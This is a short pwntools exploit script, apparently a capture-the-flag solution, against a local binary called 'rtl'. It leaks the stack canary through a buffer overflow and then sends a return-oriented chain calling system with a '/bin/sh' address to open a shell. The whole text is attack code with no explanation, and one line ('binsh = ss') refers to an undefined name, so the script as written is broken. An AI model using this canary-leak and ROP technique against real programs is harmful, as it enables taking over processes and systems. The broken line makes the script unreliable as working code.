from pwn import *

p = process('./rtl')
e = ELF('./rtl')


payload = b'A' * 0x039
p.sendafter(b'Buf: ',payload)
p.recvuntil(payload)
canary = u64(b'\x00'+p.recvn(7))

system_plt = e.plt['system']
binsh = ss
binsh = 0x400874
pop_rdi = 0x0000000000400853
ret = 0x0000000000400285

payload = b'A' * 0x38 + p64(canary) + b'B'*0x8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system_plt)

p.sendafter(b'Buf: ', payload)
p.interactive()